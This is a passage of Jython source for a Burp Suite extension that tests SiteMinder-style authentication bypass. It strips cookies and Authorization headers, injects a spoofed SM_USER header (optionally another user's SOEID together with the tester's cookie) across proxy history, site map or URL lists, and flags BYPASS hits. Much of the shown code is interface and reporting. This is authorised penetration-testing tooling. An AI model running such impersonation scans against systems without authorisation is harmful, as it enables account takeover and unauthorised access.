        header.setBackground(Color(240, 244, 248))
        widths = [50, 60, 500, 80, 80, 80, 60, 80, 70, 80, 80, 60, 500]
        for i, w in enumerate(widths):
            self._table.getColumnModel().getColumn(i).setPreferredWidth(w)
        self._table.setSelectionMode(ListSelectionModel.SINGLE_SELECTION)
        # Apply the coloured / striped renderer to every column.
        renderer = _RowRenderer(verdict_col=7, mode_col=8)
        for i in range(len(cols)):
            self._table.getColumnModel().getColumn(i).setCellRenderer(renderer)
        self._table.addMouseListener(_TableRowAdapter(self))

        # Filter rows (above the table)
        # Row 1: content-type filters
        type_row = JPanel(FlowLayout(FlowLayout.LEFT, 4, 2))
        type_row.setBorder(BorderFactory.createEmptyBorder(2, 6, 2, 6))
        type_row.add(JLabel("Show response types:"))
        self._type_cbs = {}
        for t in CONTENT_TYPES:
            cb = JCheckBox(t, True)
            cb.addActionListener(self._al(lambda ev: self._refresh_type_filter()))
            type_row.add(cb)
            self._type_cbs[t] = cb
        all_btn = JButton("All")
        all_btn.addActionListener(self._al(
            lambda ev: self._set_all_type_cbs(True)))
        none_btn = JButton("None")
        none_btn.addActionListener(self._al(
            lambda ev: self._set_all_type_cbs(False)))
        type_row.add(all_btn)
        type_row.add(none_btn)

        # Row 2: verdict filters (BYPASS / MAYBE / PUBLIC / N/A)
        verdict_row = JPanel(FlowLayout(FlowLayout.LEFT, 4, 2))
        verdict_row.setBorder(BorderFactory.createEmptyBorder(0, 6, 2, 6))
        verdict_row.add(JLabel("Show verdicts:"))
        self._verdict_cbs = {}
        for v in VERDICTS:
            cb = JCheckBox(v, True)
            cb.addActionListener(self._al(lambda ev: self._refresh_type_filter()))
            verdict_row.add(cb)
            self._verdict_cbs[v] = cb
        vall_btn = JButton("All")
        vall_btn.addActionListener(self._al(
            lambda ev: self._set_all_verdict_cbs(True)))
        vnone_btn = JButton("None")
        vnone_btn.addActionListener(self._al(
            lambda ev: self._set_all_verdict_cbs(False)))
        verdict_row.add(vall_btn)
        verdict_row.add(vnone_btn)

        filter_stack = JPanel()
        filter_stack.setLayout(BoxLayout(filter_stack, BoxLayout.Y_AXIS))
        filter_stack.add(type_row)
        filter_stack.add(verdict_row)

        table_area = JPanel(BorderLayout())
        table_area.add(filter_stack,             BorderLayout.NORTH)
        table_area.add(JScrollPane(self._table), BorderLayout.CENTER)

        table_scroll = table_area  # keep the variable name used below

        # ---------- log ----------
        self._log_area = JTextArea(8, 80)
        self._log_area.setEditable(False)
        self._log_area.setFont(_FONT_MONO_S)
        self._log_area.setBackground(Color(250, 250, 250))
        log_scroll = JScrollPane(self._log_area)
        log_scroll.setBorder(BorderFactory.createTitledBorder("Log"))

        bottom_split = JSplitPane(JSplitPane.VERTICAL_SPLIT,
                                  table_scroll, log_scroll)
        bottom_split.setResizeWeight(0.75)
        bottom_split.setDividerLocation(360)

        main_split = JSplitPane(JSplitPane.VERTICAL_SPLIT, top, bottom_split)
        main_split.setResizeWeight(0.0)
        main_split.setDividerLocation(330)

        self._main_panel.add(main_split, BorderLayout.CENTER)

    def _al(self, fn):
        class L(ActionListener):
            def actionPerformed(inner, ev):
                try:
                    fn(ev)
                except:
                    traceback.print_exc()
        return L()

    # ---- summary bar (coloured verdict counts under the progress bar) ----
    def _summary_label(self, key, value, color):
        """Build one coloured "<KEY>: <value>" label for the summary bar."""
        lbl = JLabel("%s: %s" % (key, value))
        lbl.setFont(_FONT_UI_B)
        lbl.setForeground(color)
        return lbl

    def _refresh_summary_bar(self):
        """Re-read verdict counters and repaint the summary bar. Cheap; the
        summary bar has only 5 labels so we always update them all."""
        total  = self._working_counter.get()
        bypass = self._verdict_counters["BYPASS"].get()
        maybe  = self._verdict_counters["MAYBE"].get()
        public = self._verdict_counters["PUBLIC"].get()
        na     = self._verdict_counters["N/A"].get()
        def upd():
            self._summary_label_hits.setText("Hits: %d" % total)
            self._summary_label_bypass.setText("BYPASS: %d" % bypass)
            self._summary_label_maybe.setText("MAYBE: %d" % maybe)
            self._summary_label_public.setText("PUBLIC: %d" % public)
            self._summary_label_na.setText("N/A: %d" % na)
        SwingUtilities.invokeLater(_R(upd))

    # ---- context menu ---------------------------------------------
    def createMenuItems(self, invocation):
        items = ArrayList()
        sel = invocation.getSelectedMessages()
        if not sel:
            return items
        label = "Test with %s bypass (%d)" % (
            self._header_name_field.getText(), len(sel))
        mi = JMenuItem(label)
        mi.addActionListener(self._al(
            lambda ev, s=sel: self._start_scan(list(s), "context selection")))
        items.add(mi)
        return items

    # ---- action handlers ------------------------------------------
    def _on_scan_history(self, event):
        items = self._callbacks.getProxyHistory()
        if not items:
            self._log("Proxy history is empty.")
            return
        self._start_scan(list(items), "proxy history")

    def _on_scan_sitemap(self, event):
        items = self._callbacks.getSiteMap(None)
        if not items:
            self._log("Site map is empty.")
            return
        self._start_scan(list(items), "site map")

    def _on_scan_both(self, event):
        history = list(self._callbacks.getProxyHistory() or [])
        sitemap = list(self._callbacks.getSiteMap(None) or [])
        combined = history + sitemap
        if not combined:
            self._log("Both proxy history and site map are empty.")
            return
        self._log("Combined sources: %d proxy history + %d site map = %d raw items."
                  % (len(history), len(sitemap), len(combined)))
        self._start_scan(combined, "proxy history + site map")

    def _on_load_urls(self, event):
        ch = JFileChooser()
        ch.setDialogTitle("Select a URL list (.txt / .list)")
        ch.setFileFilter(FileNameExtensionFilter(
            "Text / URL list (.txt, .list, .urls)", ["txt", "list", "urls"]))
        if ch.showOpenDialog(self._main_panel) != JFileChooser.APPROVE_OPTION:
            return
        path = ch.getSelectedFile().getAbsolutePath()
        self._log("Loading URLs from: " + path)

        items = []
        parse_errors = 0
        blank_or_comment = 0
        line_count = 0
        try:
            f = codecs.open(path, "r", "utf-8", errors="replace")
            try:
                for line in f:
                    line_count += 1
                    stripped = line.strip()
                    if not stripped or stripped.startswith("#"):
                        blank_or_comment += 1
                        continue
                    parsed = _parse_url_line(line)
                    if not parsed:
                        parse_errors += 1
                        continue
                    method, url_str = parsed
                    item = _url_to_item(self._helpers, method, url_str)
                    if item is None:
                        parse_errors += 1
                        continue
                    items.append(item)
            finally:
                f.close()
        except IOError as ex:
            self._log("Cannot read file: " + str(ex))
            return
        except Exception as ex:
            self._log("Error reading file: " + str(ex))
            traceback.print_exc()
            return

        if not items:
            self._log("No valid URLs found in %s (lines=%d, blank/comment=%d, errors=%d)."
                      % (path, line_count, blank_or_comment, parse_errors))
            return

        basename = os.path.basename(path)
        self._log("Loaded %d URLs from %s (lines=%d, blank/comment=%d, parse errors=%d)."
                  % (len(items), basename, line_count,
                     blank_or_comment, parse_errors))
        self._start_scan(items, "url file: " + basename)

    def _on_stop(self, event):
        if not self._is_running:
            return
        self._log("[!] Stop requested; workers will finish in-flight requests then exit.")
        self._cancel_flag.set()
        if self._executor is not None:
            try:
                self._executor.shutdownNow()
            except:
                traceback.print_exc()

    def _on_clear(self, event):
        if self._is_running:
            self._log("Cannot clear while running. Stop first.")
            return
        with self._tested_keys_lock:
            self._tested_keys.clear()
        with self._hits_data_lock:
            self._hits_data.clear()
        self._table_model.setRowCount(0)
        self._log_area.setText("")
        self._request_counter.set(0)
        self._working_counter.set(0)
        self._skipped_counter.set(0)
        self._other_counter.set(0)
        self._total_planned.set(0)
        for c in self._verdict_counters.values():
            c.set(0)
        self._progress_bar.setValue(0)
        self._progress_bar.setString("Idle")
        self._refresh_summary_bar()

    def _on_browse_output_dir(self, event):
        ch = JFileChooser()
        ch.setFileSelectionMode(JFileChooser.DIRECTORIES_ONLY)
        cur = self._output_dir_field.getText()
        if cur:
            ch.setSelectedFile(File(cur))
        if ch.showOpenDialog(self._main_panel) == JFileChooser.APPROVE_OPTION:
            self._output_dir_field.setText(
                ch.getSelectedFile().getAbsolutePath())

    def _on_open_output(self, event):
        p = self._output_dir_field.getText().strip()
        if not p:
            return
        try:
            if not os.path.isdir(p):
                os.makedirs(p)
        except OSError as ex:
            self._log("Could not create output dir: " + str(ex))
            return
        try:
            Desktop.getDesktop().open(File(p))
        except:
            self._log("Cannot open folder in file browser: " + p)

    def _copy_to_clipboard(self, urls, label):
        if not urls:
            self._log("No %s URLs to copy." % label)
            JOptionPane.showMessageDialog(
                self._main_panel,
                "No %s URLs found in the results table." % label,
                "SM_USER Bypass", JOptionPane.INFORMATION_MESSAGE)
            return
        text = "\n".join(urls) + "\n"
        try:
            Toolkit.getDefaultToolkit().getSystemClipboard().setContents(
                StringSelection(text), None)
            self._log("Copied %d %s URL(s) to clipboard." % (len(urls), label))
        except:
            traceback.print_exc()
            self._log("Failed to copy to clipboard.")

    def _on_copy_bypass_urls(self, event):
        """Iterate the underlying model (not filtered view) for every row
        whose Verdict is BYPASS."""
        urls = []
        model = self._table_model
        for i in range(model.getRowCount()):
            verdict = model.getValueAt(i, 7)   # Verdict column
            if verdict is not None and str(verdict) == "BYPASS":
                u = model.getValueAt(i, 2)     # URL column
                if u:
                    urls.append(str(u))
        # Dedup while preserving order.
        seen = set(); ordered = []
        for u in urls:
            if u in seen: continue
            seen.add(u); ordered.append(u)
        self._copy_to_clipboard(ordered, "BYPASS")

    def _on_copy_visible_urls(self, event):
        """Iterate what the table is actually showing after filters + sort."""
        urls = []
        view_rows = self._table.getRowCount()
        for view_row in range(view_rows):
            model_row = self._table.convertRowIndexToModel(view_row)
            u = self._table_model.getValueAt(model_row, 2)
            if u:
                urls.append(str(u))
        seen = set(); ordered = []
        for u in urls:
            if u in seen: continue
            seen.add(u); ordered.append(u)
        self._copy_to_clipboard(ordered, "visible")

    def _export_hit_by_idx(self, idx):
        """Write a .txt for a single hit using bytes retained in _hits_data."""
        try:
            key = int(idx)
        except:
            return None
        with self._hits_data_lock:
            data = self._hits_data.get(key)
        if not data:
            return None
        faux_result = {
            "index"              : key,
            "method"             : data["method"],
            "url"                : data["url"],
            "new_status"         : data["new_status"],
            "new_request_bytes"  : data["request"],
            "new_response_bytes" : data["response"],
            "exported_to"        : None,
        }
        return self._write_hit_file(faux_result)

    def _on_export_visible_hits(self, event):
        """Write .txt files for every row currently visible in the table."""
        view_rows = self._table.getRowCount()
        if view_rows == 0:
            self._log("No visible rows to export.")
            JOptionPane.showMessageDialog(
                self._main_panel,
                "No rows are currently visible in the results table.",
                "SM_USER Bypass", JOptionPane.INFORMATION_MESSAGE)
            return
        exported = 0
        failed = 0
        for view_row in range(view_rows):
            model_row = self._table.convertRowIndexToModel(view_row)
            idx = self._table_model.getValueAt(model_row, 0)
            path = self._export_hit_by_idx(idx)
            if path:
                exported += 1
                # Update the "Exported To" column so the user can double-click
                # or right-click to open the freshly written file.
                mr, p = model_row, path
                def upd(mr=mr, p=p):
                    self._table_model.setValueAt(p, mr, 12)
                SwingUtilities.invokeLater(_R(upd))
            else:
                failed += 1
        msg = "Exported %d hit(s) to output folder." % exported
        if failed:
            msg += " (%d failed -- bytes not in memory)" % failed
        self._log(msg)

    # ---- scan orchestration ---------------------------------------
    def _start_scan(self, items, source_label):
        if self._is_running:
            self._log("A scan is already running.")
            return

        try:
            threads = max(1, int(self._threads_field.getText()))
        except (ValueError, TypeError):
            threads = int(DEFAULT_THREADS)
        try:
            delay = max(0, int(self._delay_field.getText()))
        except (ValueError, TypeError):
            delay = int(DEFAULT_DELAY_MS)

        out_dir = self._output_dir_field.getText().strip()
        try:
            if out_dir and not os.path.isdir(out_dir):
                os.makedirs(out_dir)
        except OSError as ex:
            self._log("Cannot create output dir: " + str(ex))
            return

        h_name  = self._header_name_field.getText().strip()
        h_value = self._header_value_field.getText().replace("\r", "").replace("\n", "")
        if not h_name:
            self._log("Header name cannot be empty.")
            return

        working_codes = self._parse_codes(self._working_codes_field.getText())
        skip_codes    = self._parse_codes(self._skip_codes_field.getText())
        if not working_codes:
            self._log('At least one "working" status code is required.')
            return

        in_scope_only    = self._in_scope_only_cb.isSelected()
        dedup            = self._dedup_cb.isSelected()
        normalize        = self._normalize_cb.isSelected()
        strip_auth       = self._strip_auth_cb.isSelected()
        log_hits         = self._log_hits_cb.isSelected()
        verify_baseline  = self._verify_baseline_cb.isSelected()
        privesc_mode     = self._privesc_mode_cb.isSelected()
        auto_save        = self._auto_save_cb.isSelected()
        custom_cookie    = self._custom_cookie_field.getText().replace(
                              "\r", "").replace("\n", "").strip()
        skip_exts        = _parse_extensions(self._skip_ext_field.getText())

        if privesc_mode and not custom_cookie:
            self._log("Privesc mode is on but Custom Cookie is empty. "
                      "Paste your Cookie header value (or turn Privesc "
                      "mode off) and try again.")
            return

        self._log("Filtering %d source items..." % len(items))
        planned = []
        planned_urls = []   # [(method, url_str)] used to write the manifest
        skipped_null_item    = 0
        skipped_no_request   = 0
        skipped_no_service   = 0
        skipped_analyze_fail = 0
        skipped_no_url       = 0
        skipped_scope        = 0
        skipped_static       = 0
        skipped_dup          = 0
        for it in items:
            if it is None:
                skipped_null_item += 1;    continue
            if it.getRequest() is None:
                skipped_no_request += 1;   continue
            if it.getHttpService() is None:
                skipped_no_service += 1;   continue
            try:
                info = self._helpers.analyzeRequest(it)
                url  = info.getUrl()
            except:
                skipped_analyze_fail += 1; continue
            if url is None:
                skipped_no_url += 1;       continue
            if in_scope_only and not self._callbacks.isInScope(url):
                skipped_scope += 1;        continue
            if skip_exts and _url_extension(url) in skip_exts:
                skipped_static += 1;       continue
            method = info.getMethod()
            if dedup:
                key = _endpoint_key(method, url, normalize)
                with self._tested_keys_lock:
                    if key in self._tested_keys:
                        skipped_dup += 1;  continue
                    self._tested_keys.add(key)
            planned.append(it)
            planned_urls.append((method, url.toString()))

        if not planned:
            self._log("Nothing to scan from %s (scope-skipped %d, static-skipped %d, dup-skipped %d)."
                      % (source_label, skipped_scope, skipped_static, skipped_dup))
            if in_scope_only:
                self._log('Hint: uncheck "In-scope items only" or add a Burp scope.')
            return

        self._log("Scanning %d requests from %s (scope-skipped %d, static-skipped %d, dup-skipped %d)"
                  % (len(planned), source_label, skipped_scope, skipped_static, skipped_dup))

        # Write a manifest of every URL that will be sent, so the user can
        # grep it to verify that any specific vuln URL was actually tested.
        # Only when Auto-save is enabled.
        if auto_save:
            self._write_planned_manifest(
                planned_urls, source_label, len(items),
                skipped_scope, skipped_static, skipped_dup,
                skipped_no_request + skipped_no_service +
                skipped_no_url + skipped_analyze_fail + skipped_null_item)
        self._log("  Injected header : %s: %s" % (h_name, h_value))
        self._log("  Mode: %s" % ("PRIVESC (custom cookies + SM_USER)"
                                   if privesc_mode
                                   else "BYPASS (no cookies + SM_USER)"))
        self._log("  Threads=%d  DelayMs=%d  InScopeOnly=%s  Dedup=%s  Normalize=%s  StripAuth=%s  VerifyBaseline=%s  AutoSave=%s"
                  % (threads, delay, in_scope_only, dedup, normalize, strip_auth, verify_baseline, auto_save))
        self._log("  Working codes   : %s" % sorted(working_codes))
        self._log("  Skip codes      : %s" % sorted(skip_codes))
        self._log("  Output dir      : %s" % out_dir)

        self._cancel_flag.clear()
        self._is_running = True
        self._request_counter.set(0)
        self._working_counter.set(0)
        self._skipped_counter.set(0)
        self._other_counter.set(0)
        for c in self._verdict_counters.values():
            c.set(0)
        self._total_planned.set(len(planned))
        self._last_ui_update_ms.set(0)

        self._pf_source_count    = len(items)
        self._pf_scope_skipped   = skipped_scope
        self._pf_static_skipped  = skipped_static
        self._pf_dup_skipped     = skipped_dup
        self._pf_no_request      = skipped_no_request
        self._pf_no_service      = skipped_no_service
        self._pf_no_url          = skipped_no_url
        self._pf_analyze_fail    = skipped_analyze_fail
        self._pf_null_item       = skipped_null_item

        SwingUtilities.invokeLater(_R(self._begin_run_ui))

        runner = _SubmitAndWatch(
            self, planned, h_name, h_value, working_codes, skip_codes,
            strip_auth, delay, threads, log_hits, verify_baseline,
            privesc_mode, custom_cookie, auto_save)
        runner.setDaemon(True)
        runner.start()

    def _begin_run_ui(self):
        self._btn_stop.setEnabled(True)
        self._btn_scan_history.setEnabled(False)
        self._btn_scan_sitemap.setEnabled(False)
        self._btn_scan_both.setEnabled(False)
        self._btn_load_urls.setEnabled(False)
        self._btn_clear.setEnabled(False)
        self._progress_bar.setValue(0)
        self._progress_bar.setString("Starting...")

    def _reset_buttons(self):
        self._btn_stop.setEnabled(False)
        self._btn_scan_history.setEnabled(True)
        self._btn_scan_sitemap.setEnabled(True)
        self._btn_scan_both.setEnabled(True)
        self._btn_load_urls.setEnabled(True)
        self._btn_clear.setEnabled(True)

    def _finish_run(self):
        self._is_running = False
        SwingUtilities.invokeLater(_R(self._reset_buttons))
        done    = self._request_counter.get()
        planned = self._total_planned.get()
        working = self._working_counter.get()
        skipped = self._skipped_counter.get()
        other   = self._other_counter.get()
        msg = ("Scan complete. %d/%d processed  |  hits: %d  |  "
               "redirect-skipped: %d  |  other: %d" %
               (done, planned, working, skipped, other))
        self._log("[+] " + msg)
        # Full audit trail: every source item MUST land in one of these
        # buckets. If the equation doesn't balance, something is being
        # dropped silently and we want to know about it.
        source = self._pf_source_count
        parts  = [("planned",       planned),
                  ("scope",         self._pf_scope_skipped),
                  ("static-ext",    self._pf_static_skipped),
                  ("dup-collapsed", self._pf_dup_skipped),
                  ("no-request",    self._pf_no_request),
                  ("no-service",    self._pf_no_service),
                  ("no-url",        self._pf_no_url),
                  ("analyze-fail",  self._pf_analyze_fail),
                  ("null-item",     self._pf_null_item)]
        total_accounted = sum(v for _, v in parts)
        breakdown = "  +  ".join("%s:%d" % (k, v) for k, v in parts if v)
        self._log("    Audit: source=%d  =  %s" % (source, breakdown or "0"))
        if total_accounted != source:
            self._log("    [!] Accounting mismatch: %d source vs %d accounted."
                      % (source, total_accounted))
        def upd():
            self._progress_bar.setValue(100 if planned else 0)
            self._progress_bar.setString(msg)
        SwingUtilities.invokeLater(_R(upd))
        self._refresh_summary_bar()

    # ---- helpers --------------------------------------------------
    def _parse_codes(self, text):
        out = set()
        for tok in (text or "").split(","):
            tok = tok.strip()
            if not tok:
                continue
            try:
                out.add(int(tok))
            except ValueError:
                pass
        return out

    def _record_hit(self, result):
        row = [
            result["index"], result["method"], result["url"],
            result["orig_status"] if result["orig_status"] is not None else "-",
            result["anon_status"] if result.get("anon_status") is not None else "-",
            result["new_status"],
            result.get("content_type") or "NONE",
            result.get("verdict") or "N/A",
            result.get("mode") or "BYPASS",
            result.get("vs_original") or "N/A",
            result["new_length"],
            result["diff"] if result["diff"] is not None else "-",
            result.get("exported_to") or "",
        ]
        def add():
            self._table_model.addRow(row)
        SwingUtilities.invokeLater(_R(add))

    # ---- content-type + verdict filters ----------------------------
    def _allowed_types(self):
        return set(t for t, cb in self._type_cbs.items() if cb.isSelected())

    def _allowed_verdicts(self):
        return set(v for v, cb in self._verdict_cbs.items() if cb.isSelected())

    def _refresh_type_filter(self):
        try:
            self._table_sorter.setRowFilter(_TypeRowFilter(self))
        except:
            traceback.print_exc()

    def _set_all_type_cbs(self, value):
        for cb in self._type_cbs.values():
            cb.setSelected(value)
        self._refresh_type_filter()

    def _set_all_verdict_cbs(self, value):
        for cb in self._verdict_cbs.values():
            cb.setSelected(value)
        self._refresh_type_filter()

    def _update_progress(self, force=False):
        now = System.currentTimeMillis()
        if not force:
            last = self._last_ui_update_ms.get()
            if now - last < UI_THROTTLE_MS:
                return
            if not self._last_ui_update_ms.compareAndSet(last, now):
                return
        else:
            self._last_ui_update_ms.set(now)

        done    = self._request_counter.get()
        planned = self._total_planned.get()
        working = self._working_counter.get()
        skipped = self._skipped_counter.get()
        other   = self._other_counter.get()
        pct = int(100.0 * done / planned) if planned else 0
        text = ("%d/%d  hits:%d  skipped:%d  other:%d"
                % (done, planned, working, skipped, other))
        def upd():
            self._progress_bar.setValue(pct)
            self._progress_bar.setString(text)
        SwingUtilities.invokeLater(_R(upd))

    def _log(self, msg):
        stamp = datetime.datetime.now().strftime("%H:%M:%S")
        line = "[%s] %s\n" % (stamp, msg)
        def app():
            self._log_area.append(line)
            doc = self._log_area.getDocument()
            if doc.getLength() > LOG_MAX_CHARS:
                try:
                    doc.remove(0, LOG_TRIM_CHARS)
                except:
                    pass
            self._log_area.setCaretPosition(doc.getLength())
        SwingUtilities.invokeLater(_R(app))
        try:
            print(line.rstrip())
        except:
            pass

    def _sanitize(self, s):
        s = re.sub(r"^https?://", "", s)
        s = s.split("?", 1)[0]
        s = re.sub(r"[^A-Za-z0-9._-]", "_", s)
        return s.strip("_")[:100]

    def _add_hit_data(self, idx, service, request, response,
                      method, url, new_status, orig_status, exported_path,
                      anon_request=None, anon_response=None,
                      anon_status=None, verdict=None, mode=None):
        """Retain the raw bytes so the double-click dialog can render them
        in a Burp message editor. No cap -- every hit stays in memory."""
        with self._hits_data_lock:
            self._hits_data[int(idx)] = {
                "service"       : service,
                "request"       : request,
                "response"      : response,
                "method"        : method,
                "url"           : url,
                "new_status"    : new_status,
                "orig_status"   : orig_status,
                "exported_path" : exported_path,
                "anon_request"  : anon_request,
                "anon_response" : anon_response,
                "anon_status"   : anon_status,
                "verdict"       : verdict,
                "mode"          : mode,
            }

    def _show_hit_dialog(self, idx):
        """Pop up a Burp-native request/response viewer for one hit."""
        try:
            key = int(idx)
        except:
            return
        with self._hits_data_lock:
            data = self._hits_data.get(key)
        if not data:
            JOptionPane.showMessageDialog(
                self._main_panel,
                ("Bytes for hit #%d are not in memory (extension may have "
                 "been reloaded).\nOpen the exported .txt from the Output "
                 "Folder instead." % key),
                "SM_USER Bypass", JOptionPane.WARNING_MESSAGE)
            return

        controller = _HitController(data["service"],
                                    data["request"], data["response"])
        req_ed  = self._callbacks.createMessageEditor(controller, False)
        resp_ed = self._callbacks.createMessageEditor(controller, False)
        req_ed.setMessage(data["request"], True)
        resp_ed.setMessage(data["response"], False)

        req_wrap = JPanel(BorderLayout())
        req_wrap.setBorder(BorderFactory.createTitledBorder("Modified Request"))
        req_wrap.add(req_ed.getComponent(), BorderLayout.CENTER)

        resp_wrap = JPanel(BorderLayout())
        resp_wrap.setBorder(BorderFactory.createTitledBorder(
            "Response  |  %d  |  %d bytes" %
            (data["new_status"], len(data["response"]))))
        resp_wrap.add(resp_ed.getComponent(), BorderLayout.CENTER)

        split = JSplitPane(JSplitPane.HORIZONTAL_SPLIT, req_wrap, resp_wrap)
        split.setResizeWeight(0.5)

        # ---- header strip: URL + copy button + close button ----
        header = JPanel(BorderLayout(6, 0))
        header.setBorder(BorderFactory.createEmptyBorder(4, 6, 4, 6))
        url_field = JTextField(data["url"])
        url_field.setEditable(False)
        url_field.setFont(Font("Monospaced", Font.PLAIN, 12))
        header.add(JLabel("URL:"), BorderLayout.WEST)
        header.add(url_field, BorderLayout.CENTER)

        btns = JPanel(FlowLayout(FlowLayout.RIGHT, 4, 0))
        copy_btn = JButton("Copy URL")
        close_btn = JButton("Close")
        btns.add(copy_btn)
        btns.add(close_btn)
        header.add(btns, BorderLayout.EAST)

        short_url = data["url"]
        if len(short_url) > 100:
            short_url = short_url[:97] + "..."
        title = ("SM_USER Hit #%d  |  %s  |  orig=%s new=%s  |  %s" %
                 (key, data["method"],
                  data["orig_status"] if data["orig_status"] is not None else "?",
                  data["new_status"], short_url))

        parent = SwingUtilities.getWindowAncestor(self._main_panel)
        dialog = JDialog(parent, title, False)   # non-modal
        dialog.setDefaultCloseOperation(JDialog.DISPOSE_ON_CLOSE)
        dialog.getContentPane().setLayout(BorderLayout())
        dialog.getContentPane().add(header, BorderLayout.NORTH)
        dialog.getContentPane().add(split, BorderLayout.CENTER)
        dialog.setSize(1300, 750)
        dialog.setLocationRelativeTo(self._main_panel)

        # Button actions
        copy_btn.addActionListener(self._al(
            lambda ev, u=data["url"]: Toolkit.getDefaultToolkit()
            .getSystemClipboard().setContents(StringSelection(u), None)))
        close_btn.addActionListener(self._al(lambda ev: dialog.dispose()))

        # ESC closes
        esc = KeyStroke.getKeyStroke(KeyEvent.VK_ESCAPE, 0)
        class _Close(AbstractAction):
            def actionPerformed(inner, ev):
                dialog.dispose()
        dialog.getRootPane().getInputMap(
            JComponent.WHEN_IN_FOCUSED_WINDOW).put(esc, "close")
        dialog.getRootPane().getActionMap().put("close", _Close())

        dialog.setVisible(True)
        split.setDividerLocation(0.5)

    def _write_planned_manifest(self, planned_urls, source_label, source_count,
                                scope_dropped, static_dropped, dup_collapsed,
                                other_dropped):
        """At scan start, dump every (METHOD, URL) about to be sent so the
        user can grep it to prove a specific target URL was in the plan."""
        out_dir = self._output_dir_field.getText().strip()
        if not out_dir:
            return
        try:
            if not os.path.isdir(out_dir):
                os.makedirs(out_dir)
        except OSError:
            return
        stamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        path = os.path.join(out_dir, "_planned_%s.txt" % stamp)
        try:
            fos = FileOutputStream(path)
            try:
                fos.write(_s("# Planned URLs for scan started %s\n"
                             % datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
                fos.write(_s("# Source: %s\n" % source_label))
                fos.write(_s("# Source items: %d  |  Planned: %d\n"
                             % (source_count, len(planned_urls))))
                fos.write(_s("# Pre-filter drops -> scope:%d  static-ext:%d  "
                             "dup-collapsed:%d  other:%d\n"
                             % (scope_dropped, static_dropped,
                                dup_collapsed, other_dropped)))
                fos.write(_s("# One line per request that will be sent "
                             "(format: METHOD URL)\n\n"))
                for method, url_str in planned_urls:
                    fos.write(_s("%s %s\n" % (method, url_str)))
            finally:
                fos.close()
            self._log("Planned-URLs manifest: " + path)
        except:
            traceback.print_exc()

    def _write_hit_file(self, result):
        """Write request bytes + blank line + response bytes. Nothing else."""
        out_dir = self._output_dir_field.getText().strip()
        if not out_dir:
            return None
        try:
            if not os.path.isdir(out_dir):
                os.makedirs(out_dir)
        except OSError:
            return None

        stamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S_%f")[:-3]
        base  = self._sanitize(result["url"])
        fname = "%05d_%s_%s_%d_%s.txt" % (
            result["index"], stamp, result["method"],
            result["new_status"], base)
        path = os.path.join(out_dir, fname)

        req_bytes  = result.get("new_request_bytes")
        resp_bytes = result.get("new_response_bytes")

        try:
            fos = FileOutputStream(path)
            try:
                if req_bytes is not None:
                    fos.write(req_bytes)
                fos.write(_s("\r\n\r\n"))
                if resp_bytes is not None:
                    fos.write(resp_bytes)
            finally:
                fos.close()
            result["exported_to"] = path
            return path
        except:
            traceback.print_exc()
            return None


# ============================================================================
#  Helpers - runnables, workers, adapter
# ============================================================================

class _R(Runnable):
    """Wrap a python callable as a java.lang.Runnable (for EDT dispatch)."""
    def __init__(self, fn):
        self._fn = fn
    def run(self):
        try:
            self._fn()
        except:
            traceback.print_exc()


def _v_sep():
    """Thin vertical grey pipe used as a visual separator between
    button groups in a FlowLayout row."""
    lbl = JLabel(" | ")
    lbl.setForeground(Color(180, 190, 200))
    lbl.setFont(_FONT_UI)
    return lbl


class _RowRenderer(DefaultTableCellRenderer):
    """Table cell renderer that:
        * stripes alternate rows for readability
        * paints the Verdict column with a coloured background + bold
        * paints the Mode column with a subtle coloured background
    Selection colours are left to the L&F so highlighted rows still look
    like normal Swing selection.
    """
    def __init__(self, verdict_col, mode_col):
        # Call the parent constructor explicitly for Jython/Java interop.
        DefaultTableCellRenderer.__init__(self)
        self._verdict_col = verdict_col
        self._mode_col    = mode_col

    def getTableCellRendererComponent(self, table, value, isSelected,
                                      hasFocus, row, column):
        c = DefaultTableCellRenderer.getTableCellRendererComponent(
            self, table, value, isSelected, hasFocus, row, column)
        try:
            val = str(value) if value is not None else ""
            if isSelected:
                # Leave selection styling to L&F.
                return c
            # 1. Base stripe background.
            if row % 2 == 1:
                c.setBackground(_STRIPE_ODD)
            else:
                c.setBackground(_STRIPE_EVEN)
            c.setForeground(Color.BLACK)
            # 2. Special columns override the background.
            if column == self._verdict_col:
                bg = VERDICT_COLORS.get(val)
                if bg is not None:
                    c.setBackground(bg)
                    c.setFont(_FONT_UI_B)
                else:
                    c.setFont(_FONT_UI)
            elif column == self._mode_col:
                bg = MODE_COLORS.get(val)
                if bg is not None:
                    c.setBackground(bg)
                    c.setFont(_FONT_UI_B)
                else:
                    c.setFont(_FONT_UI)
            else:
                c.setFont(_FONT_UI)
        except:
            pass
        return c


class _RequestWorker(Runnable):
    def __init__(self, ext, item, h_name, h_value,
                 working_codes, skip_codes, strip_auth, delay_ms, log_hits,
                 verify_baseline, privesc_mode, custom_cookie, auto_save):
        self.ext             = ext
        self.item            = item
        self.h_name          = h_name
        self.h_value         = h_value
        self.working_codes   = working_codes
        self.skip_codes      = skip_codes
        self.strip_auth      = strip_auth
        self.delay_ms        = delay_ms
        self.log_hits        = log_hits
        self.verify_baseline = verify_baseline
        self.privesc_mode    = privesc_mode
        self.custom_cookie   = custom_cookie
        self.auto_save       = auto_save

    def run(self):
        try:
            if not self.ext._cancel_flag.is_set():
                self._process()
        except:
            traceback.print_exc()
        finally:
            self.ext._request_counter.incrementAndGet()
            self.ext._update_progress()

    def _process(self):
        ext     = self.ext
        helpers = ext._helpers
        item    = self.item

        service      = item.getHttpService()
        original_req = item.getRequest()
        info         = helpers.analyzeRequest(item)
        url          = info.getUrl()
        method       = info.getMethod()

        orig_status = None
        orig_len    = None
        orig_response = item.getResponse()
        if orig_response is not None:
            try:
                orig_status = helpers.analyzeResponse(orig_response).getStatusCode()
                orig_len    = len(orig_response)
            except:
                pass

        # Rebuild headers. Two modes:
        #   BYPASS  -> drop Cookie entirely, add/replace SM_USER.
        #   PRIVESC -> drop the *original* Cookie, insert our custom Cookie,
        #              add/replace SM_USER (to another user's SOEID).
        original_headers = list(info.getHeaders())
        new_headers      = []
        replaced_target  = False
        target_prefix    = self.h_name.lower() + ":"
        for h in original_headers:
            lower = h.lower()
            if lower.startswith("cookie:"):
                continue                          # always drop original cookie
            if self.strip_auth and lower.startswith("authorization:"):
                continue
            if lower.startswith(target_prefix):
                new_headers.append("%s: %s" % (self.h_name, self.h_value))
                replaced_target = True
                continue
            new_headers.append(h)
